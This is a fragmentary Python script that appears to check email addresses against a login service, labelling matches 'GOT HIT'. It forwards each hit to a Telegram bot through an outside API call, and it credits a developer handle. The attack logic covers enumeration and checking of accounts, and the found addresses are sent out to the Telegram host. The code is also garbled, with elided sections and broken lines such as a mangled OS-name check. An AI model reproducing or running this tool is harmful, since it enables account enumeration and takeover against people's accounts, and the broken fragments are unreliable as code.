...
'login_attempt_countn':'0'
			         ...
			         if ('"The username you entered ') in re:
			         	os.system('cls'if os.
 name=='net'else'clear')
			         	print(f"{S}𝐒𝐄𝐀𝐑𝐂𝐇𝐈𝐍𝐆 ..........:-     {Z1}{email}")
			         elif ('"bad_password"') in re:
			         	os.system('cls'if os.
 name=='net'else'clear')
			         	print(f"{F}𝐁𝐀𝐃 𝐆𝐌𝐀𝐈𝐋 😓 :-  {Z1}{email}")
    ...
    'version': '1',
			         		...
			         		if "Good" in re:
			         					os.system('cls'if os.
 name=='net'else'clear');print(f"{F}𝐆𝐎𝐓 𝐇𝐈𝐓:- {F}{email}")
			         					try:
			         						user=email.split('@')[0]
...
Email : {email}
Dev: @MJ_EHRA''';requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text="+str(ff))
			         		else:
			         			os.system('cls'if os.
 name=='net'else'clear');print(f"{S}𝐒𝐄𝐀𝐑𝐂𝐇𝐈𝐍𝐆 .........:-    {B}{email}")			
			         	except:
			         		 os.system('cls'if os.
 name=='net'else'clear')
			         		 print(Z+"Error In Communication")
